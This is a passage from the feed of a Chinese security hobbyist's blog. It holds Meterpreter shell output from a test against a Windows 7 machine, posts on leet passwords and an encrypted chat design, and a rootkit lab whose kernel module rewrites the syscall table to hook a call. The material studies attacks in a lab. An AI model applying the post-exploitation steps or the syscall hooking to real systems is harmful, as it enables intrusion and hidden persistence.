WOW64)</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WorkGroup</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter     : x86/win32</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2432 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           USER-20170312IA</span><br><span class="line">OS ����:          Microsoft Windows 7 �콢�� </span><br><span class="line">OS �汾:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     User</span><br><span class="line">ע������֯:       User</span><br><span class="line">��Ʒ ID:          00426-OEM-8992662-00006</span><br><span class="line">��ʼ��װ����:     2017/3/12, 10:33:43</span><br><span class="line">ϵͳ����ʱ��:     2017/4/27, 1:45:53</span><br><span class="line">ϵͳ������:       Hasee Computer</span><br><span class="line">ϵͳ�ͺ�:         CW65</span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 �������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 58 Stepping 9 GenuineIntel ~1275 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 4.6.5, 2013/5/6</span><br><span class="line">Windows Ŀ¼:     C:\Windows</span><br><span class="line">ϵͳĿ¼:         C:\Windows\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume1</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00)���������죬�����ر�����������³ľ�</span><br><span class="line">�����ڴ�����:     3,991 MB</span><br><span class="line">���õ������ڴ�:   2,494 MB</span><br><span class="line">�����ڴ�: ����ֵ: 7,981 MB</span><br><span class="line">�����ڴ�: ����:   6,291 MB</span><br><span class="line">�����ڴ�: ʹ����: 1,690 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WorkGroup</span><br><span class="line">��¼������:       ��ȱ</span><br><span class="line">�޲�����:         ��װ�� 124 ���޲����</span><br><span class="line">                  [01]: KB2849697</span><br><span class="line">                  [02]: KB2849696</span><br><span class="line">                  [03]: KB2841134</span><br><span class="line">                  [04]: KB2841134</span><br><span class="line">                  [05]: KB2670838</span><br><span class="line">                  [06]: KB2830477</span><br><span class="line">                  [07]: KB2592687</span><br><span class="line">                  [08]: KB917607</span><br><span class="line">                  [09]: KB2909210</span><br><span class="line">                  [10]: KB2929437</span><br><span class="line">                  [11]: KB3000483</span><br><span class="line">                  [12]: KB3004361</span><br><span class="line">                  [13]: KB3004375</span><br><span class="line">                  [14]: KB3019215</span><br><span class="line">                  [15]: KB3020369</span><br><span class="line">                  [16]: KB3020388</span><br><span class="line">                  [17]: KB3021674</span><br><span class="line">                  [18]: KB3022777</span><br><span class="line">                  [19]: KB3023215</span><br><span class="line">                  [20]: KB3030377</span><br><span class="line">                  [21]: KB3031432</span><br><span class="line">                  [22]: KB3032655</span><br><span class="line">                  [23]: KB3033889</span><br><span class="line">                  [24]: KB3033890</span><br><span class="line">                  [25]: KB3033929</span><br><span class="line">                  [26]: KB3035126</span><br><span class="line">                  [27]: KB3035132</span><br><span class="line">                  [28]: KB3037574</span><br><span class="line">                  [29]: KB3042058</span><br><span class="line">                  [30]: KB3042553</span><br><span class="line">                  [31]: KB3045685</span><br><span class="line">                  [32]: KB3046017</span><br><span class="line">                  [33]: KB3046269</span><br><span class="line">                  [34]: KB3055642</span><br><span class="line">                  [35]: KB3059317</span><br><span class="line">                  [36]: KB3060716</span><br><span class="line">                  [37]: KB3061518</span><br><span class="line">                  [38]: KB3067903</span><br><span class="line">                  [39]: KB3069392</span><br><span class="line">                  [40]: KB3069762</span><br><span class="line">                  [41]: KB3071756</span><br><span class="line">                  [42]: KB3072305</span><br><span class="line">                  [43]: KB3072630</span><br><span class="line">                  [44]: KB3072633</span><br><span class="line">                  [45]: KB3074543</span><br><span class="line">                  [46]: KB3075226</span><br><span class="line">                  [47]: KB3076895</span><br><span class="line">                  [48]: KB3076949</span><br><span class="line">                  [49]: KB3078071</span><br><span class="line">                  [50]: KB3078601</span><br><span class="line">                  [51]: KB3080446</span><br><span class="line">                  [52]: KB3081320</span><br><span class="line">                  [53]: KB3084135</span><br><span class="line">                  [54]: KB3086255</span><br><span class="line">                  [55]: KB3087039</span><br><span class="line">                  [56]: KB3092601</span><br><span class="line">                  [57]: KB3093513</span><br><span class="line">                  [58]: KB3097966</span><br><span class="line">                  [59]: KB3097989</span><br><span class="line">                  [60]: KB3099862</span><br><span class="line">                  [61]: KB3100213</span><br><span class="line">                  [62]: KB3101246</span><br><span class="line">                  [63]: KB3101722</span><br><span class="line">                  [64]: KB3101746</span><br><span class="line">                  [65]: KB3108371</span><br><span class="line">                  [66]: KB3108381</span><br><span class="line">                  [67]: KB3108664</span><br><span class="line">                  [68]: KB3108670</span><br><span class="line">                  [69]: KB3109094</span><br><span class="line">                  [70]: KB3109103</span><br><span class="line">                  [71]: KB3109560</span><br><span class="line">                  [72]: KB3110329</span><br><span class="line">                  [73]: KB3112343</span><br><span class="line">                  [74]: KB3115858</span><br><span class="line">                  [75]: KB3121461</span><br><span class="line">                  [76]: KB3122648</span><br><span class="line">                  [77]: KB3123479</span><br><span class="line">                  [78]: KB3124280</span><br><span class="line">                  [79]: KB3126446</span><br><span class="line">                  [80]: KB3126587</span><br><span class="line">                  [81]: KB3127220</span><br><span class="line">                  [82]: KB3135983</span><br><span class="line">                  [83]: KB3138612</span><br><span class="line">                  [84]: KB3138910</span><br><span class="line">                  [85]: KB3138962</span><br><span class="line">                  [86]: KB3139398</span><br><span class="line">                  [87]: KB3139914</span><br><span class="line">                  [88]: KB3139940</span><br><span class="line">                  [89]: KB3140735</span><br><span class="line">                  [90]: KB3142024</span><br><span class="line">                  [91]: KB3142042</span><br><span class="line">                  [92]: KB3145739</span><br><span class="line">                  [93]: KB3146706</span><br><span class="line">                  [94]: KB3146963</span><br><span class="line">                  [95]: KB3149090</span><br><span class="line">                  [96]: KB3153171</span><br><span class="line">                  [97]: KB3153199</span><br><span class="line">                  [98]: KB3153731</span><br><span class="line">                  [99]: KB3155178</span><br><span class="line">                  [100]: KB3156013</span><br><span class="line">                  [101]: KB3156016</span><br><span class="line">                  [102]: KB3156017</span><br><span class="line">                  [103]: KB3156019</span><br><span class="line">                  [104]: KB3159398</span><br><span class="line">                  [105]: KB3161561</span><br><span class="line">                  [106]: KB3161949</span><br><span class="line">                  [107]: KB3161958</span><br><span class="line">                  [108]: KB3163245</span><br><span class="line">                  [109]: KB3164033</span><br><span class="line">                  [110]: KB3164035</span><br><span class="line">                  [111]: KB3170455</span><br><span class="line">                  [112]: KB3177186</span><br><span class="line">                  [113]: KB3178034</span><br><span class="line">                  [114]: KB3184122</span><br><span class="line">                  [115]: KB3185911</span><br><span class="line">                  [116]: KB3188730</span><br><span class="line">                  [117]: KB3192391</span><br><span class="line">                  [118]: KB3205394</span><br><span class="line">                  [119]: KB3210131</span><br><span class="line">                  [120]: KB3212642</span><br><span class="line">                  [121]: KB4012204</span><br><span class="line">                  [122]: KB4014565</span><br><span class="line">                  [123]: KB4014661</span><br><span class="line">                  [124]: KB4015546</span><br><span class="line">����:             ��װ�� 4 �� NIC��</span><br><span class="line">                  [01]: Qualcomm Atheros AR9485WB-EG Wireless Network Adapter</span><br><span class="line">                      ������:      �����������</span><br><span class="line">                      ���� DHCP:   �</span><br><span class="line">                      DHCP ������: 192.168.31.1</span><br><span class="line">                      IP ��ַ</span><br><span class="line">                        [01]: 192.168.31.252</span><br><span class="line">                        [02]: fe80::5d70:a440:294c:b455</span><br><span class="line">                  [02]: Realtek PCIe GBE Family Controller</span><br><span class="line">                      ������:      �������</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line">                  [03]: Microsoft Virtual WiFi Miniport Adapter</span><br><span class="line">                      ������:      ������������ 2</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line">                  [04]: VPN Client Adapter - VPN</span><br><span class="line">                      ������:      VPN - VPN Client</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">\\ ���û��ʻ�</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    </span><br><span class="line">�����������ϣ�������һ�����������</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>建议尽快升级系统或者关闭相关服务来缓解NSA工具集带来的冲击,BTW，我主要用的PC是GNU/Linux并不用Windows．</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;凌晨亲自测试NSA Tools，感叹MS08-067时代复现．&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
      <category term="misc" scheme="https://embpgp.github.io/categories/study/misc/"/>
    
    
      <category term="exploit" scheme="https://embpgp.github.io/tags/exploit/"/>
    
      <category term="shellcode" scheme="https://embpgp.github.io/tags/shellcode/"/>
    
      <category term="NSA" scheme="https://embpgp.github.io/tags/NSA/"/>
    
      <category term="msf" scheme="https://embpgp.github.io/tags/msf/"/>
    
      <category term="shadowbroker" scheme="https://embpgp.github.io/tags/shadowbroker/"/>
    
  </entry>
  
  <entry>
    <title>Leet体验</title>
    <link href="https://embpgp.github.io/2017/03/18/Leet%E4%BD%93%E9%AA%8C/"/>
    <id>https://embpgp.github.io/2017/03/18/Leet体验/</id>
    <published>2017-03-18T12:07:26.000Z</published>
    <updated>2025-03-11T12:14:38.958Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>仅仅是装x用?</p></blockquote><span id="more"></span><hr><h1 id="密码强度"><a href="#密码强度" class="headerlink" title="密码强度"></a>密码强度</h1><p>目前互联网安全最严重的漏洞在于人，各大平台撞库的大多原因就是设置了简单而又相同的密码，还有某些管理员…。人们生活已经离不开密码了，如何设置密码有时候是个很头痛的问题，以至于出现了像1Password这样的企业。诚然，搜索一些前人的经验可以知道有很多种方法，比如<a href="https://www.zhihu.com/question/21201996">知乎这里</a>的讨论可以参考，建议有一套自己的”转换公式”。在想好了字符串之后再来进行一次”润色”。</p><h1 id="Leet"><a href="#Leet" class="headerlink" title="Leet"></a>Leet</h1><p>找到这个’Leet’源于今天在某论坛帖子中看到汇编代码中含有0xdeadbeef这样的字眼，觉得这种”Hexspeak”很有趣,还有好多Magic Number的故事呢…以下盗的一张维基百科的图就是主要的”润色”规则，其名曰:Leet，应该就是传说中的黑客俚语(详情请继续搜索引擎)。可以看到26个字母都能够被各种转换,经典的用法就是把阿拉伯数字转换成英文字母。比如1&lt;–&gt;i(l),2&lt;–&gt;Z,3&lt;–&gt;e,4&lt;–&gt;a,5&lt;–&gt;s($),6&lt;–&gt;b,7&lt;–&gt;t,8&lt;–&gt;B,9&lt;–&gt;g,0&lt;–&gt;O(个人常用)。这里主要的命名规则是从肉眼上很相像(所谓’形象字’)和读音(比如4&lt;–&gt;for,2&lt;–&gt;to等)，在输入到计算机里面的时候一般的情况下密码强度能够得到大大提高，当然，包括标点字符也是。在互联网上看到各种ID貌似很大成分参考了这部分，so，能猜到我的域名含义?<br><img src="/images/Leet_by_wikipedia.png" alt="Leet_by_wikipedia.png"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>要是管理员太渣密码强度再高也是于事无补…在信息泄露已经司空见惯的现在，多长点心二吧<del>_</del> :&gt;)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;仅仅是装x用?&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="misc" scheme="https://embpgp.github.io/categories/misc/"/>
    
    
      <category term="misc" scheme="https://embpgp.github.io/tags/misc/"/>
    
      <category term="Sec" scheme="https://embpgp.github.io/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>端到端加密IM预想</title>
    <link href="https://embpgp.github.io/2017/03/05/%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86IM%E9%A2%84%E6%83%B3/"/>
    <id>https://embpgp.github.io/2017/03/05/端到端加密IM预想/</id>
    <published>2017-03-05T15:03:34.000Z</published>
    <updated>2025-03-11T12:14:38.968Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>从古代烽火通信到二战电台破译，从ARPANET被研发出来至目前互联网，消息加解密会是永恒的主题。近期Google宣布SHA-1发现碰撞，后斯诺登时代信息泄露事件仍在不断发生。一直想学习相关技术并应用于实践，在此进行大致预想。</p></blockquote><span id="more"></span><hr><ul><li>基本开发语言想用python来开发，因为python跨平台，三大PC平台都支持。</li><li>而UI设计方面为了简单直接使用黑窗口(习惯了Linux的shell了)。</li><li>基于CS架构所以客户端和服务端都必须开源实现。</li><li>应该必须支持单聊和群聊，当然前期可以不考虑大的并发量和大量用户注册等相关复杂业务，重在功能实现。</li><li>最重要的是实现端到端的加解密。</li><li>......</li></ul><hr><p>当然上述功能网络上已经有很多优秀的软件实现了(诸如Telegram等)，并且可能做的还要好，而我的想法就是”造造轮子”，学习并应用相关技术才是目的。有兴趣可以一起学习并探讨…</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;从古代烽火通信到二战电台破译，从ARPANET被研发出来至目前互联网，消息加解密会是永恒的主题。近期Google宣布SHA-1发现碰撞，后斯诺登时代信息泄露事件仍在不断发生。一直想学习相关技术并应用于实践，在此进行大致预想。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="misc" scheme="https://embpgp.github.io/categories/misc/"/>
    
    
      <category term="misc" scheme="https://embpgp.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>r00tk1t init</title>
    <link href="https://embpgp.github.io/2017/01/12/r00tk1t-init/"/>
    <id>https://embpgp.github.io/2017/01/12/r00tk1t-init/</id>
    <published>2017-01-12T13:33:55.000Z</published>
    <updated>2025-03-11T12:14:38.967Z</updated>
    
    <content type="html"><![CDATA[<p>参考:<br><a href="http://www.freebuf.com/articles/system/54263.html">http://www.freebuf.com/articles/system/54263.html</a><br><a href="https://chirath02.wordpress.com/tag/asmlinkage/">https://chirath02.wordpress.com/tag/asmlinkage/</a><br><a href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd">r00tk1t基础实验</a><br><a href="https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/">https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/</a><br><a href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a><br><a href="http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf">http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf</a><br><a href="https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/">https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/</a></p><span id="more"></span><h1 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s this?"></a>What’s this?</h1><p>关于其概念可以参考<a href="https://en.wikipedia.org/wiki/Rootkit">维基百科</a>。</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>建议不要在物理机下实验~因此我根据<a href="https://chirath02.wordpress.com/tag/asmlinkage/">这里</a>介绍的情况便去ubuntu的官方网站下载了ubuntu 15.10的i386镜像。然后用VMWare安装ISO，便开始按照里面的指令进行修改和编译。其中增加的系统调用是根据上述的<a href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd">r00tk1t</a>增加的。修改系统调用是主要的方式之一，因此可以借鉴。</p><h1 id="编译部分"><a href="#编译部分" class="headerlink" title="编译部分"></a>编译部分</h1><p>为了方便可以直接在虚拟机里面切换到root用户，然后键入<code># apt-get source linux-image-$(uname -r)</code>即可下载虚拟机本内核源代码。然后cp到/usr/src目录，再解压出来。然后安装编译所需要的一些依赖工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get build-dep linux-image-$(uname -r)</span><br><span class="line">$ sudo apt-get install kernel-package  <span class="comment"># for make-kpkg clean</span></span><br><span class="line">$ sudo apt-get install libncurses-dev  <span class="comment"># for make menuconfig</span></span><br></pre></td></tr></table></figure><p>再之后按照教程部分增加系统调用，照葫芦画瓢。然后就<code>make menuconfig</code>配置内核编译选项，教程给的是默认(不知道修改是否编译快一些)。而后便可以开始漫长的编译过程了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br><span class="line">sudo make modules_install˖</span><br><span class="line">sudo make install</span><br><span class="line">sudo mkinitramfs -o /boot/initrd.img-2.6.32.65</span><br><span class="line">sudo update-initramfs -c -k 2.6.32.65</span><br><span class="line">sudo update-grub2 </span><br><span class="line"></span><br><span class="line">sudo vim /etc/default/grub     //注释掉下面的部分</span><br><span class="line"><span class="comment">#GRUB_HIDDEN_TIMEOUT=0</span></span><br><span class="line">sudo update-grub2 </span><br></pre></td></tr></table></figure><p>上述参考mallocfree的教程。可以使得不用完全覆盖掉原有内核选项而使得grub增加新的选项来供用户选择。<br>按照教程第一部分部分结果如下:至少我们工程的从内核任务链表中实现了相应的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~<span class="comment"># uname -r</span></span><br><span class="line">4.2.2</span><br><span class="line">root@r00t:~<span class="comment"># ps aux | grep sshd</span></span><br><span class="line">root       655  0.0  0.5  10432  5320 ?        Ss   20:13   0:00 /usr/sbin/sshd -D</span><br><span class="line">root      1144  0.0  0.6  13652  6268 ?        Ss   20:13   0:00 sshd: r00t [priv]   </span><br><span class="line">r00t      1209  0.1  0.2  13652  2948 ?        S    20:13   0:00 sshd: r00t@pts/8    </span><br><span class="line">root      1248  0.0  0.6  13652  6196 ?        Ss   20:14   0:00 sshd: r00t [priv]   </span><br><span class="line">r00t      1285  0.0  0.2  13652  2960 ?        S    20:14   0:00 sshd: r00t@pts/9    </span><br><span class="line">root      1330  0.0  0.2   5972  2308 pts/8    S+   20:19   0:00 grep --color=auto sshd</span><br><span class="line">root@r00t:~<span class="comment"># ./testPname </span></span><br><span class="line">Enter process to find</span><br><span class="line">sshd</span><br><span class="line">PID = 655</span><br><span class="line">         PID = 1144</span><br><span class="line">                   PID = 1209</span><br><span class="line">                             PID = 1248</span><br><span class="line">                                       PID = 1285</span><br><span class="line">                                                 System call returned 0</span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><p>按照freebuf的教程第一个LKM程序编译如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~/LKM<span class="comment"># make</span></span><br><span class="line">make -C /lib/modules/4.2.2/build SUBDIRS=/root/LKM modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">  CC [M]  /root/LKM/lkm.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/LKM/lkm.mod.o</span><br><span class="line">  LD [M]  /root/LKM/lkm.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># insmod lkm.ko </span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># dmesg | tail -n 1</span></span><br><span class="line">[ 4019.602327] Arciryas:module loaded</span><br><span class="line">root@r00t:~/LKM<span class="comment"># lsmod | grep lkm</span></span><br><span class="line">lkm                    16384  0</span><br><span class="line">root@r00t:~/LKM<span class="comment"># rmmod lkm.ko</span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># dmesg | tail -n 2</span></span><br><span class="line">[ 4019.602327] Arciryas:module loaded</span><br><span class="line">[ 4117.988381] Arciryas:module removed</span><br><span class="line">root@r00t:~/LKM<span class="comment"># </span></span><br></pre></td></tr></table></figure><h1 id="Kernel-Hook"><a href="#Kernel-Hook" class="headerlink" title="Kernel Hook"></a>Kernel Hook</h1><ul><li>静态的方式获得syscall表的地址<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~<span class="comment"># !cat</span></span><br><span class="line">cat /boot/System.map-4.2.2 | grep sys_call_table</span><br><span class="line">c1755140 R sys_call_table</span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>hook代码如下,稍微大概解释以下，内核模块在初始化的时候会检查sys_call_table的内存地址是否可写，一般情况下肯定是不能写的，上面的System.map文件中也看到的，因此程序会检查并通过改写其对应的内存页读写属性来强行修改表借此来hook。在模块卸载的时候又将原来的地址修改回来。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@r00t:~/LKM/pname<span class="comment"># cat captainhook.c</span></span><br><span class="line"><span class="comment">#include &lt;asm/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/cacheflush.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/pgtable_types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/highmem.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/moduleparam.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/cacheflush.h&gt;</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;rutk1t0r&quot;</span>);</span><br><span class="line">/*MY sys_call_table address*/</span><br><span class="line">//c1755140</span><br><span class="line">void **system_call_table_addr;</span><br><span class="line">/*my custom syscall that takes process name*/</span><br><span class="line">asmlinkage int (*custom_syscall) (char* name);</span><br><span class="line">/*hook*/</span><br><span class="line">asmlinkage int captain_hook(char* play_here) &#123;</span><br><span class="line">    /*<span class="keyword">do</span> whatever here (<span class="built_in">print</span> <span class="string">&quot;HAHAHA&quot;</span>, reverse their string, etc)</span><br><span class="line">        But <span class="keyword">for</span> now we will just <span class="built_in">print</span> to the dmesg <span class="built_in">log</span>*/</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> custom_syscall(play_here);</span><br><span class="line">&#125;</span><br><span class="line">/*Make page writeable*/</span><br><span class="line">int make_rw(unsigned long address)&#123;</span><br><span class="line">    unsigned int level;</span><br><span class="line">    pte_t *pte = lookup_address(address, &amp;level);</span><br><span class="line">    <span class="keyword">if</span>(pte-&gt;pte &amp;~_PAGE_RW)&#123;</span><br><span class="line">        pte-&gt;pte |=_PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">/* Make the page write protected */</span><br><span class="line">int make_ro(unsigned long address)&#123;</span><br><span class="line">    unsigned int level;</span><br><span class="line">    pte_t *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp;~_PAGE_RW;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">static int __init entry_point(void)&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Captain Hook loaded successfully..\n&quot;</span>);</span><br><span class="line">    /*MY sys_call_table address*/</span><br><span class="line">    system_call_table_addr = (void*)0xc1755140;</span><br><span class="line">    /* Replace custom syscall with the correct system call name (write,open,etc) to hook*/</span><br><span class="line">    custom_syscall = system_call_table_addr[__NR_pname];</span><br><span class="line">    /*Disable page protection*/</span><br><span class="line">    make_rw((unsigned long)system_call_table_addr);</span><br><span class="line">    /*Change syscall to our syscall <span class="keyword">function</span>*/</span><br><span class="line">    system_call_table_addr[__NR_pname] = captain_hook;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">static int __exit exit_point(void)&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook successfully\n&quot;</span>);</span><br><span class="line">    /*Restore original system call */</span><br><span class="line">    system_call_table_addr[__NR_pname] = custom_syscall;</span><br><span class="line">    /*Renable page protection*/</span><br><span class="line">    make_ro((unsigned long)system_call_table_addr);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">module_init(entry_point);</span><br><span class="line">module_exit(exit_point);</span><br></pre></td></tr></table></figure></li><li>结果如下:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~/LKM/pname<span class="comment"># insmod 